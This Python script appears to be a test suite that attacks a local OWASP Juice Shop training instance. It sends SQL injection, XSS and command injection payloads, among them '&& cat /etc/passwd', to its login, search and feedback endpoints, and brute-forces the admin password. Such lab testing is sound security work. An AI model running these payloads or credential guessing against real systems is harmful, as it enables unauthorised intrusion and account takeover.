#!/usr/bin/env python3
"""
Attack Script for OWASP Juice Shop
Tests various vulnerabilities in Juice Shop
"""

import requests
import time
import sys
import json

BASE_URL = "http://localhost:3000"

def sql_injection_juice_shop():
    """Test SQL Injection on Juice Shop"""
    print("\n" + "="*60)
    print("SQL INJECTION ATTACK ON JUICE SHOP")
    print("="*60)
    
    payloads = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT * FROM Users --",
    ]
    
    # Try SQL injection on login
    for payload in payloads:
        print(f"\n[*] Testing SQL Injection: {payload}")
        try:
            url = f"{BASE_URL}/rest/user/login"
            data = {
                'email': payload,
                'password': 'test'
            }
            response = requests.post(url, json=data, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if 'authentication' in result or 'token' in result:
                        print("[!] POTENTIAL SQL INJECTION SUCCESS!")
                except:
                    pass
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def xss_juice_shop():
    """Test XSS on Juice Shop"""
    print("\n" + "="*60)
    print("XSS ATTACK ON JUICE SHOP")
    print("="*60)
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
    ]
    
    for payload in xss_payloads:
        print(f"\n[*] Testing XSS payload: {payload[:30]}...")
        try:
            # Try on search endpoint
            url = f"{BASE_URL}/rest/products/search"
            params = {'q': payload}
            response = requests.get(url, params=params, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def command_injection_juice_shop():
    """Test Command Injection"""
    print("\n" + "="*60)
    print("COMMAND INJECTION ATTACK ON JUICE SHOP")
    print("="*60)
    
    payloads = [
        "; ls",
        "| whoami",
        "&& cat /etc/passwd",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing Command Injection: {payload}")
        try:
            # Try on various endpoints
            url = f"{BASE_URL}/api/feedback"
            data = {
                'comment': f"test{payload}",
                'rating': 5
            }
            response = requests.post(url, json=data, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def brute_force_juice_shop():
    """Test Brute Force on Juice Shop"""
    print("\n" + "="*60)
    print("BRUTE FORCE ATTACK ON JUICE SHOP")
    print("="*60)
    
    passwords = ["admin", "password", "123456", "admin123", "password123"]
    
    for password in passwords:
        print(f"\n[*] Trying password: {password}")
        try:
            url = f"{BASE_URL}/rest/user/login"
            data = {
                'email': 'admin@juice-sh.op',
                'password': password
            }
            response = requests.post(url, json=data, timeout=5)
            print(f"[+] Status Code: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if 'authentication' in result and result['authentication']:
                        print(f"[!] LOGIN SUCCESS with password: {password}")
                except:
                    pass
            time.sleep(0.3)
        except Exception as e:
            print(f"[!] Error: {e}")
    
    return True

def main():
    print("Starting Juice Shop Attack Suite...")
    print(f"Target: {BASE_URL}")
    time.sleep(2)
    
    # Wait for service to be ready
    for i in range(10):
        try:
            response = requests.get(BASE_URL, timeout=2)
            if response.status_code == 200:
                break
        except:
            pass
        time.sleep(1)
    
    sql_injection_juice_shop()
    time.sleep(1)
    xss_juice_shop()
    time.sleep(1)
    command_injection_juice_shop()
    time.sleep(1)
    brute_force_juice_shop()
    
    print("\n[+] Juice Shop attacks completed")
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)

